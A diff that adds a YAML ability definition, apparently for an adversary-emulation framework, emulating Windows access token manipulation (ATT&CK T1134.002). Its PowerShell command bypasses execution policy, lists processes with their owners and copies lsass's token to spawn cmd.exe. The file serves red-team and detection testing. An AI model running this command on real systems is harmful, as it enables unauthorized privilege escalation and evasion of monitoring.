@@ -1,0 +1,24 @@
+- description: "This Action demonstrates how an access token for a specific program\
+    \ can spawn another program under a different owner. \nAdversaries can leverage\
+    \ access tokens to run programs under a different user not only to achieve privilege\
+    \ escalation but also to evade detection by blending in with normal user activity.\
+    \ \nThis Action will query all processes and list the process name and owner.It\
+    \ will then make a copy of an existing token to create a new instance of cmd.exe\n"
+  id: 163fd8a8-7847-6002-c604-d0fe4e32a419
+  name: Access Token Manipulation
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{};
+          gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process
+          | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}; & "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1";
+          [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1134.002
+    name: Create Process with Token
